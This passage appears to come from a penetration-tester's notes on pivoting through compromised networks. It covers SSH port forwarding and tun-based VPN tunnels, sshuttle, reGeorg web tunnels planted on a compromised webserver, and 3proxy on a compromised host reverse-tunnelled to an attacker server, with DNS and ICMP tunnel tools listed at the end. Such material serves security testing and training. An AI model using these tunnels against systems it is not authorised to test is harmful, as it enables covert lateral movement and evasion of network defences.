* **localIp** being IP address to which the traffic will be routed. Most of the times it’s going to be the operator’s one 
* **localPort** being the port to which the traffic will be routed. Most of the times it’s going to be the operator’s listener’s port 
* **user** being the user he has the credential of 
* **sshGateway** being the device the operator has SSH access to 

NOTE:  The directive "GatewayPorts clientspecified" MUST be present inside the server's /etc/ssh/sshd\_config otherwise the SSH server is going to listen for connection on 127.0.0.1, thus making the tunnel useless. Make sure this directive is present inside the config, otherwise add it \(needs root privileges\) and make sure to restart the SSH server! 

### Dynamic port forwarding  

The last kind of port forwarding SSH provides is called dynamic port forwarding. This technique is kinda similar to local port forwarding, but instead of specifying a single host/port pair to which traffic will be routed, it’s the SSH gateway which gets to decide where to route the traffic. That means if you send a packet to a host in the same subnet of the SSH server, this one is going to automatically route it to the destination you specified, provided you have instructed your OS to proxy traffic through the SSH gateway. Its syntax is like this: 

`ssh -D localPort user@sshGateway` 

This technique is really useful but it has a huge downside: it often messes up the traffic and interferes with tools like nmap.  

### VPN Over ssh

Since openssh release 4.3 it is possible to tunnel layer 3 network traffic via an established ssh channel. This has an advantage over a typical tcp tunnel because you are in control of ip traffic. So, for example, you are able to perform SYN-scan with nmap and use your tools directly without resorting to proxychains or other proxifying tools. It’s done via the creation of tun devices on client and server side and transferring the data between them over ssh connection. This is quite simple, but you need root on both machines since the creation of tun devices is a privileged operation. These lines should be present in your /etc/ssh/sshd\_config file \(server-side\): 

```text
PermitRootLogin yes 
PermitTunnel yes 
```

The following command on the client will create a pair of tun devices on client and server: 

`ssh username@server -w any:any` 

The flag `-w` accepts the number of tun device on each side separated with a colon. It can be set explicitly - -w 0:0 or you can use -w any:any syntax to take the next available tun device. 

The tunnel between the tun devices is enabled but the interfaces are yet to be configured. Example of configuring client-side: 

`ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0` 

Server-side: 

`ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0` 

Enable ip forwarding and NAT on the server: 

```text
echo 1 > /proc/sys/net/ipv4/ip_forward 
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE 
```

Now you can make the peer host 1.1.1.1 your default gateway or route a specific host/network through it: 

`route add -net 10.0.0.0/16 gw 1.1.1.1` 

In this example the server’s external network interface is eth0 and the newly created tun devices on both sides are tun0. 

Credit: https://artkond.com/2017/03/23/pivoting-guide/\#vpn-over-ssh 

## sshuttle

Link: [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)

Scanning networks through a SSH gateway using dynamic port forwarding is a huge PITA most of the times. While searching for a solution to this during my time in the lab I came across SSHuttle. This tool creates a tun interface on the operator’s machine \(much like a VPN\) and then sets rules to forward traffic for the specified subnet through the tun interface. The cool thing about it is that it does not need root access to the SSH gateway \(only on the operator machine\).  

Its syntax is the following: 

`sshuttle -r user@sshGateway network/netmask` 

In the previous scenario the command to spawn a tun interface with SSHuttle and route traffic to the subnet would have been: 

`sshuttle -r root@10.0.0.1 10.0.0.0/24` 

## reGeorge

Link: [https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

The successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. 

#### Usage 

```text
$ reGeorgSocksProxy.py [-h] [-l] [-p] [-r] -u  [-v] 
Socks server for reGeorg HTTP(s) tunneller 
optional arguments: 
  -h, --help           show this help message and exit 
  -l , --listen-on     The default listening address 
  -p , --listen-port   The default listening port 
  -r , --read-buff     Local read buffer, max data to be sent per POST 
  -u , --url           The url containing the tunnel script 
  -v , --verbose       Verbose output[INFO|DEBUG] 
```

#### Steps: 

1. Upload tunnel.\(aspx\|ashx\|jsp\|php\) to a webserver \(How you do that is up to you\) 
2. Configure you tools to use a socks proxy, use the ip address and port you specified when you started the reGeorgSocksProxy.py 

#### Example: 

```text
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
 
reGeorg will create a proxy tunnel on 8080, so we can use proxychain 
proxychains nmap -sT -Pn 192.139.6.3 
```

## 3proxy

This tools works for multiple platforms. There are pre-built binaries for Windows. As for Linux, you will need to build it yourself which is not a rocket science, just ./configure && make :\) This tool is a swiss army knife in the proxy world so it has a ton of functionality. I usually use it either as a socks proxy or as a port forwarder. 

Link: [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy) 

Credit: [https://artkond.com/2017/03/23/pivoting-guide/\#3proxy](https://artkond.com/2017/03/23/pivoting-guide/#3proxy) 

### SSH reverse port forwarding /w 3proxy 

This pivoting setup looks something like this: 

Run 3proxy service with the following config on the target server: 

`socks -p31337` 

Create a separate user on the receiving side \(attacker’s machine\). 

`adduser sshproxy` 

This user has to be low-privileged and shouldn’t have shell privileges. After all, you don’t want to get reverse pentested, do ya? :\) Edit /etc/passwd and switch shell to /bin/false. It should look like: 

`sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false`   
 Now connect to your server with the newly created user with -R flag. Linux system: 

`ssh sshproxy@your_server -R 31337:127.0.0.1:31337` 

For windows you will need to upload [plink.exe](http://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html) first. This is a console version of putty. To run it: 

`plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337` 

The -R flag allows you to bind port on the server side. All connections to this port will be relayed to a specified port on the client. This way we can run 3proxy socks service on the client side \(compromised machine\) and access this port on the attacker’s host via ssh -R flag. 

## ICMP Tunnel

Use [http://code.gerade.org/hans/ ](http://code.gerade.org/hans/%20)

## DNS Tunnel

* [https://github.com/iagox86/dnscat2](https://github.com/iagox86/dnscat2)
* [https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)



